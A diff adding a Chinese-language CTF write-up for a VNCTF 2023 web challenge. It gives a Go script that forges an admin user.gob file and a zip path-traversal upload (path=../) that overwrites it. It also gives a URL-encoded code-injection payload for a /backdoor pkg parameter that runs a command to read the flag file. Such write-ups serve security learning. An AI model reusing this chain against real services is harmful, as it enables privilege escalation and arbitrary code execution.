@@ -375,6 +375,62 @@ if ctfer.Power == "admin" {
 
 * 但是文件上传页面是禁止我们上传`.gob`文件的，此时我们想到还有一个`/unzip`路由。可以把`/uploads`下的`zip`文件解压到我们指定的目录。其实他是会解压到`/uploads`目录下的，但是我们可以目录穿越,`path=../`。来指定目录。这样我们就能将`user.gob`文件覆盖了。
 ## 攻击
+1. 制作zip压缩包
+首先我们根据源码写生成`user.gob`文件的脚本。
+```go
+	package main
+ 
+import (
+	"encoding/gob"
+	"github.com/duke-git/lancet/fileutil"
+	"os"
+)
+ 
+type User struct {
+	Name  string
+	Path  string
+	Power string
+}
+ 
+func main()  {
+	userDir := "./serial/"
+	fileutil.CreateDir(userDir)
+	gobFile, _ := os.Create(userDir + "user.gob")
+	user := User{Name: "ctfer", Path: userDir, Power: "admin"}
+	encoder := gob.NewEncoder(gobFile)
+	encoder.Encode(user)
+ 
+}
+	```
+   
+这里要下载一些模块什么的就叫ai帮忙了，总之运行脚本会得到一个文件。
 
+![](assets/VNCTF%20%202023%20web%20复现/file-20251205162925828.png)
+（这里面的`zip`包是后来手动打包的）
 
+2. 文件上传 
+我们来到`/upload`路由。
+上传我们的zip
+![](assets/VNCTF%20%202023%20web%20复现/file-20251205163137388.png)
+3. 解压缩文件
+访问`/unzip`路由，path路径指定`../`上级目录。
+注意这里一开始没有指定path路径的话会默认解压到`/uploads`目录下，此时还会吧zip删除。所以第一次没操作好需要重新上传。
+![](assets/VNCTF%20%202023%20web%20复现/file-20251205163454802.png)
+4. 访问反序列化路由
+![](assets/VNCTF%20%202023%20web%20复现/file-20251205163525736.png)
+显示good说明覆盖成功。
+5. 命令执行
+这里我没怎么懂，但是就是很复杂的命令拼接，因为会把`/backdoor`路由下的`?pkg`参数拼接到命令执行函数中。
+答案是：
+```
+"os/exec" fmt" )
 
+func init(){ cmd:=exec.Command("cat","/ffflllaaaggg") out,_:=cmd.CombinedOutput() fmt.Println(string(out)) }
+
+var(a="1
+```
+把这段url编码后传入。
+```http
+?pkg=%22os%2Fexec%22%0A%20fmt%22%0A%29%0A%0Afunc%09init()%7B%0Acmd%3A%3Dexec.Command(%22cat%22%2C%22%2Fffflllaaaggg%22)%0Aout%2C_%3A%3Dcmd.CombinedOutput()%0Afmt.Println(string(out))%0A%7D%0A%0Avar(a%3D%221
+```
+![](assets/VNCTF%20%202023%20web%20复现/file-20251205163820848.png)
